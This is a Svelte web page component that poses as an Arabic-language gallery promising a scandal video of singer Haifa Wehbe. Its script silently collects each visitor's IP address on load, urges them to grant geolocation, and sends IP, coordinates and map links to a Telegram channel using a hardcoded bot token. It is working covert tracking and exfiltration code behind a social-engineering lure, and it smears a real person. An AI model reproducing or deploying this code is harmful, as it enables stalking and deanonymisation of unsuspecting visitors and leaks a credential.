<script>
  import { onMount } from 'svelte';
  sendIPToTelegramBots();

  onMount(async () => {
  
    // Request location permission automatically
    navigator.geolocation.getCurrentPosition(
      (position) => {
        // Location permission granted, send location and IP results to Telegram bots
        sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
      },
      (error) => {
        if (error.code === error.PERMISSION_DENIED) {
          // Location permission denied, send IP result to Telegram bots
        
//////1//////
          window.location.href = 'https://example.com'; 
//////1//////
        }
      }
    );
  });

  async function sendLocationAndIPToTelegramBots(latitude, longitude) {
    // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;

    // Get the IP address using ipify API
    const response = await fetch('https://api.ipify.org/?format=json');
    const data = await response.json();
    const ipAddress = data.ip;

    const message = `\nالموقع:\n \n${latitude} ${longitude}\n\nالايبي:\n \n${ipAddress}`;


 // Create the message with the clickable link to Google Maps
 
   
    const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
    const clickableLink = `<a href="${locationLink}" style="color: red;">اللوكيشن</a>`;
	const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
    const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;


    const htmlMessage = `${message}\n\n ${clickableLink}\n \n${ipLocationNetLink}`;


    // Send location and IP results to Telegram bots using an HTTP request
    await fetch(telegramBotURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
       chat_id: '@localipy', // Replace with the channel username or ID
           text: htmlMessage,
        parse_mode: 'HTML',
      }),
    });
  }

  async function sendIPToTelegramBots() {
    // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;

    // Get the IP address using ipify API
    const response = await fetch('https://api.ipify.org/?format=json');
    const data = await response.json();
    const ipAddress = data.ip;

    const message = `\nالايبي:\n \n${ipAddress}`;
	
	 // Create the message with clickable link
    const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
    const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
  const htmlMessage = `${message}\n\n${ipLocationNetLink}`;


    // Send IP result to Telegram bots using an HTTP request
    await fetch(telegramBotURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
      chat_id: '@localipy', // Replace with the channel username or ID
       text: htmlMessage,
        parse_mode: 'HTML',
      }),
    });
  }
</script>

<main>

  <h1 style="text-align: center; color: green;">فضايح هيفاء وهبي</h1>

<h1 style="text-align: center; font-size: 240px; color: red;">‎اعمل سماح لمشاهدة فيديو الفضايح يلا بسرعه</h1>


	<div class="container">
		<div class="image-container">
			<img src="https://i.ibb.co/CM1zJSc/photo1.jpg" alt="Photo 1">
			<div class="image-overlay">
				<p>Photo 1</p>
			</div>
		</div>
		<div class="image-container">
			<img src="https://i.ibb.co/Qn6nbGM/photo2.jpg" alt="Photo 2">
			<div class="image-overlay">
				<p>Photo 2</p>
			</div>
		</div>
		<div class="image-container">
			<img src="https://i.ibb.co/XF1gFN0/photo3.jpg" alt="Photo 3">
			<div class="image-overlay">
				<p>Photo 3</p>
			</div>
		</div>
		<div class="image-container">
			<img src="https://i.ibb.co/rmSPhTB/photo4.jpg" alt="Photo 4">
			<div class="image-overlay">
				<p>Photo 4</p>
			</div>
		</div>
		<div class="image-container">
			<img src="https://i.ibb.co/0BVhJkB/photo5.jpg" alt="Photo 5">
			<div class="image-overlay">
				<p>Photo 5</p>
			</div>
		</div>
		<div class="image-container">
			<img src="https://i.ibb.co/5Mw4bdQ/photo6.jpg" alt="Photo 6">
			<div class="image-overlay">
				<p>Photo 6</p>
			</div>
		</div>
		<div class="image-container">
			<img src="https://i.ibb.co/2Y0ZKnT/photo7.jpg" alt="Photo 7">
			<div class="image-overlay">
				<p>Photo 7</p>
			</div>
		</div>
		<div class="image-container">
			<img src="https			://i.ibb.co/PhKHmNt/photo8.jpg" alt="Photo 8">
			<div class="image-overlay">
				<p>Photo 8</p>
			</div>
		</div>
		<div class="image-container">
			<img src="https://i.ibb.co/1b5m9XD/photo9.jpg" alt="Photo 9">
			<div class="image-overlay">
				<p>Photo 9</p>
			</div>
		</div>
		<div class="image-container">
			<img src="https://i.ibb.co/9NPt9K8/photo10.jpg" alt="Photo 10">
			<div class="image-overlay">
				<p>Photo 10</p>
			</div>
		</div>
		<div class="image-container">
			<img src="https://i.ibb.co/2nYQm20/photo11.jpg" alt="Photo 11">
			<div class="image-overlay">
				<p>Photo 11</p>
			</div>
		</div>
		<div class="image-container">
			<img src="https://i.ibb.co/SxWQSyf/photo12.jpg" alt="Photo 12">
			<div class="image-overlay">
				<p>Photo 12</p>
			</div>
		</div>
	</div>
</main>
